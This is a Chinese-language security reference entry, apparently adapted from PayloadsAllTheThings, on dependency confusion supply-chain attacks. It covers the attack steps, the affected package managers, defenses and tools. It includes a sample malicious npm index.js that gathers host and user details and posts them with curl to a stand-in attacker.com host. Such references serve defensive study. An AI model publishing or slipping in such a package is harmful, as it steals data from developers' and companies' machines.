# Dependency Confusion - 依赖混淆

[SEARCH_KEYWORDS]
漏洞类型: Dependency Confusion Supply Chain Attack 依赖混淆 供应链攻击
攻击类型: Remote Code Execution Malware Injection Code Injection
关键词: npm pip gem package dependency supply chain private public
包管理: npm pip gem composer maven docker requirements.txt package.json
技术: Package Hijacking Name Squatting Typosquatting

[CONTENT]

## 依赖混淆概述

依赖混淆攻击（供应链替换攻击）发生在软件安装脚本被欺骗从公共存储库拉取恶意代码文件，而不是从内部存储库拉取同名的预期文件时。

## 攻击原理

1. 公司使用私有包
2. 安装脚本首先检查公共仓库
3. 攻击者在公共仓库注册同名恶意包
4. 安装脚本拉取恶意包而非私有包

## 受影响的包管理器

| 语言/平台 | 包文件 | 包管理器 |
|-----------|--------|----------|
| JavaScript | package.json | npm |
| Python | requirements.txt | pip |
| PHP | composer.json | composer |
| Java | pom.xml | maven |
| Docker | Dockerfile | DockerHub |

## 攻击方法论

### 步骤1：识别私有包

查找目标公司使用的包文件：
- package.json
- composer.json
- requirements.txt
- pom.xml

### 步骤2：检查公共仓库

在公共仓库中搜索这些包名：
- [npmjs.com](https://www.npmjs.com/)
- [pypi.org](https://pypi.org/)
- [rubygems.org](https://rubygems.org/)

### 步骤3：注册恶意包

如果包名在公共仓库中不存在：
1. 注册同名公共包
2. 包含恶意代码
3. 等待被使用

### NPM示例

```json
{
  "name": "internal-package-name",
  "version": "1.0.0",
  "main": "index.js"
}
```

恶意index.js：
```javascript
const os = require('os');
const exec = require('child_process').exec;

// 收集系统信息并发送到攻击者服务器
const data = {
  hostname: os.hostname(),
  platform: os.platform(),
  userinfo: os.userInfo()
};

exec(`curl -X POST -d '${JSON.stringify(data)}' https://attacker.com/collect`);
```

## 防护措施

1. 使用私有包仓库镜像
2. 配置包管理器优先使用私有源
3. 验证包完整性和来源
4. 使用命名空间/作用域包
5. 监控依赖变化

## 工具

- confused - 检查多个包管理系统的依赖混淆漏洞
- DepFuzzer - 查找依赖混淆或可接管邮箱的项目

## 参考文档

原始来源: PayloadsAllTheThings/Dependency Confusion/README.md